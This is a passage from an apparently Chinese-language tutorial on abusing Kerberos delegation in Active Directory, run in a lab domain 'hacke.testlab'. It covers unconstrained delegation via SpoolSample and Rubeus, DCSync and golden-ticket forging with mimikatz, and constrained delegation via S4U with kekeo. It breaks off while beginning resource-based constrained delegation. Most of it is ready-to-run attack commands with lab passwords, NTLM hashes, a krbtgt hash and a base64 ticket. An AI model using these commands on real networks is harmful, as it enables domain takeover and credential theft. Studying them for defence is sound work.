    psexec.exe -s cmd /c "Rubeus.exe monitor /interval:1 /filteruser:WIN-Q2JR4MURGS0$ > C:\user.txt " -arguments
想使用SpoolSampler需要访问域内权限，如果使用administrator执行。会出现SMB认证失败的情况！  
因此这里需要提升到system权限，或者在域用户下执行。在这里使用psexec 单条命令提到system权限，去认证执行查询操作
    psexec.exe -s cmd /c "C:\Users\Administrator\Desktop\tool\tools--main\SpoolSample\SpoolSamplerNET.exe WIN7 WIN-Q2JR4MURGS0" -arguments //前当前主机名  后域控主机名  不同工具不同写法
下载链接
    https://github.com/shigophilo/tools-
然后根据不同的系统版本选择适合的请求工具，在这里笔者环境为WIN7。因此使用SpoolSamplerNET.exe
    SpoolSamplerNET.exe WIN7 WIN-Q2JR4MURGS0   //前本机  后域控   不同工具位置不同
随后在Rubeus.exe指定的文件夹下就出现了信息  
在这里想要利用还需要获取域SID，这里我们可以通过窃取凭证或者在其他机器上拿到。因为凭证窃取AccessToken
需要交互，所以这里直接在其他域机器上拿到了sid
    S-1-5-21-3502871099-3777307143-1257297015
凭证窃取
    https://blog.csdn.net/qq_45521281/article/details/105941102
根据其他人的测试，这里可以使用mimikatz从内存中导出票据。  
但是我这里不行，这里并没有来自域控的票据  
因此在这里需要使用Rubeus导入base64格式的票据，首先将我们监听得到的base64数据继续整理
    doIFkDCCBYygAwIBBaEDAgEWooIEijCCBIZhggSCMIIEfqADAgEFoQ8bDUhBQ0tFLlRFU1RMQUKiIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDUhBQ0tFLlRFU1RMQUKjggRAMIIEPKADAgESoQMCAQWiggQuBIIEKmTwwM+czaSqrH3mlRCvLCSVu5YMlVoClCg2VPTeygORXwiA9EoHHQ1bg8v0VsXns8qJDnufDFxtqiyiui3r99842kvxVaZHKip7n4MUvOuvf/CBGmLi4vP3TgefWP9HLk1WCEhuguGh/XhaBxhQk8AXad47UFryIo/9ZHg2rn4RaUFd3/X6EzPiIffLUzvJsPillUBov7jgsfdlsDS5YLBdpTBRdoorY7vh1MPkeDd2yW0BoPdeTn4s+iJfGUuBmJkHpwKkpNZbMevb7dxC6xnI4zeMFZdL6DXxGuLxhkQTdz54R6JtN4yYbAdgTcjDX/51ox5hU3bLRLeCDdvlTHfTBGnGKAejC47Rg37XPo/GbcpNJ9bLhODEgI0zQpQuE5edEsbD78dFAusFeV7UtT45Nc6chTH7KYWcC8kbjmWvjO9pv6wTSAEqPM4MnOgXi/3BwUEIfFnQEGQoVs7Qhz6auHkLwqd4M6hK7PXGoAzGxiOmYUqu2ZiEil3qaECQMtAfw13bc3/DHf9gKpvrjnpEeXiwrEyq5fKSWzmzQsIKTc8P0Vsbn1h5ZucWPMWFK6rPFgqPhU7dhUjxmfbC0VIu2qKziHSheTSkHOBzP6jjRnLwVaE1QhX9pJz7obM0SSXXfdM9Dx385QNhcuPZm1OK6Z5Zx3wxDj7ABfA+rQmie06Y6Xk59tYFKvoMruftMwFtg1jQ0FahT1afIqO8zJDUFV94KOpK0/iNY7q3cAomZpZOnrwuFW+CetguklT8RcKcZS4KWKG3BvrZDVINjg0a8NjR86N3hWulOBmO6daaHQNSyUVEityjf+LdKqAes97zOKT+BqLks+d15MLU/4Rks5vwvRowlbpnj97TrnVXgwexOVeMGfHv5IiunXyRDcgsO3mgj/q0d8BcBTj07oB7DkxgSdNSX1M02MrnPK2fW/HL1CBpFvfFYGDBOngzSy27CtbELzhOFuDQl9P1CPKGSYBG5oUIyENu201h1jFB2+5Z2kxVbiEAJ41gVx0h9K9i93ofpCcxPLJq7ZB8R/7PcZ9vnIBjku8cTXHU96OmWDfL+3SqdRW8thzFZM3YWkKjnUUQM9k2Aquq7s03aCq1iMHGFjscmPH61oGffIFFHsDK7EuD0+b9ioOumyR6Wl38sLzayjyv7Y4tzCy+KYmPXMZKMrbgh8/QG3ldTg46aEbNzHuYzPVCneNChEtLDXoI9Ug5wHkzCo4HHB/w/heBYI3Iw0TBV04GlATybyaoSiqOMda0LSXgcz+kYPZpRgE3WhD+rSBTib7N2Rol/cY+dQchHBSQ8VZ4LtdkM2h4RAVsLda5XyM3Cav4N5mRakataR0/BM5hlt6WKecLDEi/A/Bzlth9/3pont4OboTVR6jMMu3gq+mtnfMXflZu2vjTq7LK3QOR3TGjgfEwge6gAwIBAKKB5gSB432B4DCB3aCB2jCB1zCB1KArMCmgAwIBEqEiBCA0NJed+xsActh6oKzxJ16njtYZO4TvhQ62fdwDjzSAdqEPGw1IQUNLRS5URVNUTEFCoh0wG6ADAgEBoRQwEhsQV0lOLVEySlI0TVVSR1MwJKMHAwUAYKEAAKURGA8yMDIwMTIwOTEzMzEwMlqmERgPMjAyMDEyMDkyMzMxMDBapxEYDzIwMjAxMjE2MTMzMTAwWqgPGw1IQUNLRS5URVNUTEFCqSIwIKADAgECoRkwFxsGa3JidGd0Gw1IQUNLRS5URVNUTEFC
这里需要使用base64格式导入
    Rubeus35.exe ptt /ticket:doIFkDCCBYygAwIBBaEDAgEWooIEijCCBIZhggSCMIIEfqADAgEFoQ8bDUhBQ0tFLlRFU1RMQUKiIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDUhBQ0tFLlRFU1RMQUKjggRAMIIEPKADAgESoQMCAQWiggQuBIIEKmTwwM+czaSqrH3mlRCvLCSVu5YMlVoClCg2VPTeygORXwiA9EoHHQ1bg8v0VsXns8qJDnufDFxtqiyiui3r99842kvxVaZHKip7n4MUvOuvf/CBGmLi4vP3TgefWP9HLk1WCEhuguGh/XhaBxhQk8AXad47UFryIo/9ZHg2rn4RaUFd3/X6EzPiIffLUzvJsPillUBov7jgsfdlsDS5YLBdpTBRdoorY7vh1MPkeDd2yW0BoPdeTn4s+iJfGUuBmJkHpwKkpNZbMevb7dxC6xnI4zeMFZdL6DXxGuLxhkQTdz54R6JtN4yYbAdgTcjDX/51ox5hU3bLRLeCDdvlTHfTBGnGKAejC47Rg37XPo/GbcpNJ9bLhODEgI0zQpQuE5edEsbD78dFAusFeV7UtT45Nc6chTH7KYWcC8kbjmWvjO9pv6wTSAEqPM4MnOgXi/3BwUEIfFnQEGQoVs7Qhz6auHkLwqd4M6hK7PXGoAzGxiOmYUqu2ZiEil3qaECQMtAfw13bc3/DHf9gKpvrjnpEeXiwrEyq5fKSWzmzQsIKTc8P0Vsbn1h5ZucWPMWFK6rPFgqPhU7dhUjxmfbC0VIu2qKziHSheTSkHOBzP6jjRnLwVaE1QhX9pJz7obM0SSXXfdM9Dx385QNhcuPZm1OK6Z5Zx3wxDj7ABfA+rQmie06Y6Xk59tYFKvoMruftMwFtg1jQ0FahT1afIqO8zJDUFV94KOpK0/iNY7q3cAomZpZOnrwuFW+CetguklT8RcKcZS4KWKG3BvrZDVINjg0a8NjR86N3hWulOBmO6daaHQNSyUVEityjf+LdKqAes97zOKT+BqLks+d15MLU/4Rks5vwvRowlbpnj97TrnVXgwexOVeMGfHv5IiunXyRDcgsO3mgj/q0d8BcBTj07oB7DkxgSdNSX1M02MrnPK2fW/HL1CBpFvfFYGDBOngzSy27CtbELzhOFuDQl9P1CPKGSYBG5oUIyENu201h1jFB2+5Z2kxVbiEAJ41gVx0h9K9i93ofpCcxPLJq7ZB8R/7PcZ9vnIBjku8cTXHU96OmWDfL+3SqdRW8thzFZM3YWkKjnUUQM9k2Aquq7s03aCq1iMHGFjscmPH61oGffIFFHsDK7EuD0+b9ioOumyR6Wl38sLzayjyv7Y4tzCy+KYmPXMZKMrbgh8/QG3ldTg46aEbNzHuYzPVCneNChEtLDXoI9Ug5wHkzCo4HHB/w/heBYI3Iw0TBV04GlATybyaoSiqOMda0LSXgcz+kYPZpRgE3WhD+rSBTib7N2Rol/cY+dQchHBSQ8VZ4LtdkM2h4RAVsLda5XyM3Cav4N5mRakataR0/BM5hlt6WKecLDEi/A/Bzlth9/3pont4OboTVR6jMMu3gq+mtnfMXflZu2vjTq7LK3QOR3TGjgfEwge6gAwIBAKKB5gSB432B4DCB3aCB2jCB1zCB1KArMCmgAwIBEqEiBCA0NJed+xsActh6oKzxJ16njtYZO4TvhQ62fdwDjzSAdqEPGw1IQUNLRS5URVNUTEFCoh0wG6ADAgEBoRQwEhsQV0lOLVEySlI0TVVSR1MwJKMHAwUAYKEAAKURGA8yMDIwMTIwOTEzMzEwMlqmERgPMjAyMDEyMDkyMzMxMDBapxEYDzIwMjAxMjE2MTMzMTAwWqgPGw1IQUNLRS5URVNUTEFCqSIwIKADAgECoRkwFxsGa3JidGd0Gw1IQUNLRS5URVNUTEFC
在导入成功之后，我们就可以尝试获取域控的krbtgt hash了
    mimikatz.exe "lsadump::dcsync /domain:hacke.testlab /all /csv"
在这里开始制作黄金票据，需要使用sid。在这里通过其他机器获取到sid
    S-1-5-21-3502871099-3777307143-1257297015
使用mimikatz制作ticket.kirbi 票据
    kerberos::golden /admin:Administrator /domain:hacke.testlab /sid:S-1-5-21-3502871099-3777307143-1257297015 /krbtgt:2e1c1d8ccc005ba4da4af2adeb72dd39 /ptt
这时候我们就可以尝试访问域控了！  
(2) 两个会话，一个system/administrator 一个域内权限
这里其实和之前那个一样，只不过可以通过域内权限获取sid而已!
## 约束委派
### 原理
由于非约束委派的不安全性，微软在windows service
2003中引入了约束委派，对kerberos协议进行了扩展，引入了S4U，其中S4U支持两个子协议：S4U2Self和S4U2proxy。这两个协议可以代替任何用户从KDC请求票据。S4U2self可以代表自身请求对其自身的kerberos服务票据(ST)；S4U2proxy可以以用户名义请求其他服务的ST，约束委派就限制了S4U2proxy扩展的范围。
注：其中步骤1-4代表S4U2Self请求的过程，步骤5-10代表S4U2proxy的请求过程  
上述请求的文字描述：
    1. 用户向service1发出请求。用户已通过身份验证，但service1没有用户的授权数据。通常，这是由于身份验证是通过Kerberos以外的其他方式验证的。
    2. 通过S4U2self扩展以用户的名义向KDC请求用于访问service1的ST1。
    3. KDC返回给Service1一个用于用户验证Service1的ST1，该ST1可能包含用户的授权数据。
    4. service1可以使用ST中的授权数据来满足用户的请求，然后响应用户。
    注：尽管S4U2self向service1提供有关用户的信息，但S4U2self不允许service1代表用户发出其他服务的请求，这时候就轮到S4U2proxy发挥作用了
    5. 用户向service1发出请求，service1需要以用户身份访问service2上的资源。
    6. service1以用户的名义向KDC请求用户访问service2的ST2
    7. 如果请求中包含PAC，则KDC通过检查PAC的签名数据来验证PAC ，如果PAC有效或不存在，则KDC返回ST2给service1，但存储在ST2的cname和crealm字段中的客户端身份是用户的身份，而不是service1的身份。
    8. service1使用ST2以用户的名义向service2发送请求，并判定用户已由KDC进行身份验证。
    9. service2响应步骤8的请求。
    10. service1响应用户对步骤5中的请求。
### 约束配置
想要配置委派，首先需要将账号绑定SPN服务。主机账号默认加入域时会绑定几个默认的SPN，而域账号则需要通过spn命令来设置。在这里不演示如何配置约束委派。
### 约束委派信息搜集
**Empire下的powerview.ps1脚本**
**配置了约束委派的服务域账号**
    powershell.exe -exec bypass -Command "& {Import-Module .\powerview.ps1;Get-DomainUser -TrustedToAuth -Domain hacke.testlab | select name }"
**配置了约束委派的服务机器账号**
    powershell.exe -exec bypass -Command "& {Import-Module .\powerview.ps1;Get-DomainComputer -TrustedToAuth -Domain hacke.testlab | select name}"
**ADFind**
**域用户服务账号以及对应的委派对象**
    AdFind.exe -b "DC=hacke,DC=testlab" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" cn distinguishedName msds-allowedtodelegateto
**主机机器服务账户以及对应的委派对象**
    AdFind.exe -b "DC=hacke,DC=testlab" -f "(&(samAccountType=805306369)(msds-allowedtodelegateto=*))" cn distinguishedName msds-allowedtodelegateto
### 约束资源委派攻击
域用户服务账号和主机服务账号，同样可以获取伪造高权限对应服务票据。
#### 使用域账号服务凭证获取
域用户服务账号：weipai  
域用户服务账号密码:QWE123!@#
通过Empire下的powerview.ps1脚本查找约束委派账号
    powershell.exe -exec bypass -Command "& {Import-Module .\powerview.ps1;Get-DomainUser -TrustedToAuth -Domain hacke.testlab | select name }"
但是这里还需要知道这两个用户委派的是SPN服务，使用AdFind.exe发现域用户的委派spn对象
    AdFind.exe -b dc=hacke,dc=testlab -f "(&(objectCategory=user)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=16777216))" msDS-AllowedToDelegateTo
在这里可以看到委派的SPN对象，这里weipai域用户服务账号委派的是域控的445权限。因此这里伪造尝试访问域控的445。
首先需要伪造S4U，这里需要获取weipai域账号的明文密码。
使用kekeo请求该用户的TGT
    tgt::ask /user:weipai /domain:hacke.testlab /password:QWE123!@# /ticket:test.kirbi
当破解不出明文密码时，还可以使用NTLM hash!
    tgt::ask /user:weipai /domain:hacke.testlab /NTLM:b4f27a13d0f78d5ad83750095ef2d8ec
在这里获取到了访问服务本身的tgt票据：
    TGT_weipai@HACKE.TESTLAB_krbtgt~PI:EMAIL
随后使用这张可转发的TGT票据去伪造s4u请求以administrador用户权限访问SPN委派服务
    tgs::s4u /tgt:TGT_weipai@HACKE.TESTLAB_krbtgt~PI:EMAIL /user:Administrator@hacke.testlab /service:cifs/WIN-Q2JR4MURGS0.hacke.testlab
S4U2Self获取到的ST1以及S4UProxy获取到的WIN-Q2JR4MURGS0 CIFS服务的ST2会保存在目录下
然后我们使用mimikatz将ST2导入当前会话即可
    kerberos::ptt TGS_Administrator@hacke.testlab@HACKE.TESTLAB_cifs~PI:EMAIL
没导入前无法访问域控WIN-Q2JR4MURGS0 CIFS服务
    dir \\WIN-Q2JR4MURGS0\C$
导入后则可以访问  
#### 使用机器账户服务凭证申请
AdFind发现主机的委派SPN对象
    AdFind.exe -b dc=hacke,dc=testlab -f "(&(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=16777216))" msDS-AllowedToDelegateTo
WIN8$的NTLM如下
    [00000003] Primary
         * Username : WIN8$
         * Domain   : HACKE
         * NTLM     : 7b335709cb4c692de6cd42b328fe8b1b
         * SHA1     : a3903dbf45c7b12186eec1b430f74fa3de7a4051
在这里也可以使用机器账户委派，需要生成一个机器账户的票据。因为机器账户的密码成不规则，所以在这里使用ntlm格式去生成。使用kekeo去生成票据
    tgt::ask /user:WIN8$ /domain:hacke.testlab /NTLM:7b335709cb4c692de6cd42b328fe8b1b
随后使用这张"服务票据"去进行S4U阶段的伪造
    tgs::s4u /tgt:TGT_WIN8$@HACKE.TESTLAB_krbtgt~PI:EMAIL /user:Administrator /service:cifs/WIN-Q2JR4MURGS0.hacke.testlab
在没有导入之前访问域控的cifs服务  
在这里使用mimikaze导入
    kerberos::ptt TGS_Administrator@HACKE.TESTLAB_cifs~PI:EMAIL
在其他未设置约束委派的机器上，使用WIN8$机器账户的凭证发起请求。也可以获取可转发的ST票据。
#### 额外的知识点
##### 服务账号的区分
在文章说到的：  
(1)注：在Windows系统中，只有服务账号和主机账号的属性才有委派功能，普通用户默认是没有的  
(2) 在一个域中只有服务账号才有委派功能，使用如下命令将ghtwf01设为服务账号  
1、2存在悖论，根据2中的意思是只要绑定SPN服务就为服务账号。而1中则将能够委派的账号分为服务账号和主机账号。但是在加入域的主机账号已经自动绑定了SPN服务成为了2中的服务账号。
因此服务账号可分为域用户服务账号、机器服务账号
在这里主机账号、机器账号通过文章阅读在利用上没有什么差别，但是在其他地方我不肯定。
##### 申请凭证的根源
约束委派中，发起请求的服务。在灵腾实验室中是用主机机器服务账号来进行演示的，在先知的文章中是使用域成员服务账号来演示的！在笔者一开始理解中，以为约束和非约束一样都是需要用户来访问主机机器服务账号所登录的机器才能成功。
但看了先知的文章发现没有提及主机服务账号设置委派进行约束攻击，导致我非常的疑惑。且那时候没有搞明白一个点，到底是谁，哪个服务去发起的请求。是设置主机机器服务账号的机器本身去申请的吗？是设置了域成员服务账号所登录的主机去申请的吗?
因此在人家的实验过程中，实在理解不了使用设置委派服务的账号密码去申请TGT这一过程。因为在当时我所看的大部分文章都是互相抄袭，没有委派阶段同时实验域服务和主机服务的过程！但是在我阅读很多次以后，我明确了一个观点！所谓service1服务
伪造用户请求service2，其实就是使用设置委派的账号生成一个TGT，从而这个TGT就代表了service1服务！
从而接下来的过程就变得非常透彻了，使用这个tgt去申请S4U过程就变得很好理解了！
## 非约束和约束委派总结
在非约束委派种，只有非约束委派的主机机器服务账户才起作用。而约束委派则是域服务账户和主机机器服务账户都可以起作用！并且他们使用的信息搜集都是使用ldap协议去查询某个键值。
## 基于资源的约束委派 RBCD
在这里主要参考了A-Team的文章"微软不认的“0day”之域内本地提权-烂番茄（Rotten Tomato）"，在略结合自己的一些实践来写。
### 原理
基于资源的约束委派是一种允许自己去设置哪些账户委派给自己的约束委派，它和前面两种不同的地方就是前者是由域控上的高权限账户设置的，而且则可以自己指定。
传统的约束委派是"正向的"，通过修改服务A属性"msDS-AllowedToDelegateTo"，添加服务B的SPN(Service Prinvice
Name)，设置约束委派对象(服务B)，服务A便可以模拟用户向域控制器请求服务B以获得服务票据(TGS)来使用服务B的资源。
而基于资源的约束委派则相反，通过修改服务B属性"msDS-AllowedToActOnBehalfOfOtherIdentity"，添加服务A的SPN，达到让服务A模拟用户访问B资源的目的。  
### 实验环境
域控 192.168.60.1  
WIN7 192.168.60.3  
WIN8 192.168.60.2
使用CS、MSF进行非交互式实验
### 首先模拟上线域内成员
工具事先已经上传到机器当中  
### 信息搜集
因为是win7机器，所以在这里使用v3.5环境编译的EXE进行信息搜集
    shell  C:\Users\test\Desktop\CreatorSIDQuery\v3.5\CreatorSIDQuery.exe > C:\Users\test\Desktop\CreatorSIDQuery\v3.5\user.txt
随后使用命令读取查看
    shell type C:\Users\test\Desktop\CreatorSIDQuery\v3.5\user.txt
可以在这里看到WIN8、WIN7机器账号都是由test域账号加入到hacke.testlab域当中的！之所以说是机器账号而不直接说WIN8、WIN7主机，是因为使用test域普通账号创建的机器账号也会显示在这里！
但是在我的实验环境中目前没有用test创建机器账户，因此这里WIN8、WIN7都是主机。我们可以通过ping的方式找到对应的IP。  
也就是说我们可以通过目前的test域普通账号，拿到WIN7 WIN8两台机器的system权限
### 创建接受委派的机器用户
根据委派的规则，我们需要一个SPN服务账户来接受委派。但是我们目前只有域内用户test的凭证。这个时候该怎么办呢？